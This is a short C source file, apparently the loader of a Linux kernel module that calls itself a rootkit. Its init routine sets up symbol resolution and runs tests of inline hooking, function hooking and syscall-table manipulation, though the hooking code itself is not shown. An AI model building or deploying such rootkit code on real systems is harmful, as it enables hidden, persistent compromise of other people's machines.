#include "log.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <asm/cacheflush.h>
#include <linux/semaphore.h>
#include <linux/slab.h>

#include "symbol.h"

#include "../tests/tests.h"

static int __init rootkit_init_module(void)
{
    /* Init rootkit */
    init_symbols();

    /* Run some tests */
    test_inline_hooking();
    test_hook();
    test_syscall_tbl();

    return 0;
}

extern int g_schischi;
static void __exit rootkit_cleanup_module(void)
{
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
MODULE_LICENSE("GPL");
